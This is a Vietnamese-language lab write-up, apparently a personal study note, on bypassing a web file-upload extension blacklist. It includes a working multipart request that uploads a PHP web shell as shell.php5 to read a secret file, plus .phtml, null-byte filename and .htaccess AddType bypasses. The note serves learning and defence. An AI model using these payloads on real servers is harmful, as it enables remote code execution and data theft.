![[upload-extension.png]]
Lab dùng .php5 / .phtml / filename traversal để qua blacklist.

> [!NOTE] phân tích đề
> - lab chặn `.php` nhưng blacklist thiếu.
> - sau khi quan sát ... mình thấy up `shell.php` thì bị chặn.
> - -> nhưng config server vẫn chạy php5/phtml.
> - nên mình thử đuôi lạ.
> - nếu vẫn chặn thì thử traversal trong filename.
> - liên quan: [[lys thuyet file upload]] , [[Lab-File upload content-type bypass]]

### hướng giải
- [ ] login `wiener:peter`.
- [ ] thử `shell.php` để xác nhận blacklist.
- [ ] thử `shell.php5`, `shell.phtml` lần lượt.
- [ ] nếu fail thì thử `shell.php%00.jpg` hoặc `../.htaccess`.
- [ ] GET tới shell để đọc secret.

### giải
- mình thử `.php5`:
```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=----abc

------abc
Content-Disposition: form-data; name="avatar"; filename="shell.php5"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------abc--
```
- response:
```html
File uploaded to /files/avatars/shell.php5
```
- -> qua được rồi.
- mình GET:
```http
GET /files/avatars/shell.php5 HTTP/1.1
```
- -> ra secret luôn.
- nếu server chặn luôn `.php5`, mình thử tiếp:
```
filename="shell.phtml"
```
- -> đa số Apache vẫn chạy `.phtml` như php.
- còn nếu chặn hết đuôi php, mình thử ghi đè config:
```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .jpg
```
- -> rồi up `shell.jpg` chứa php là cũng chạy.
- kết quả: đọc được `/home/carlos/secret`.

> [!NOTE] bài học
> - blacklist không bao giờ đủ.
> - nên mình luôn có list `.php5`, `.phtml`, `.phar` sẵn.
> - `.htaccess` là đường vòng hay quên nhất.
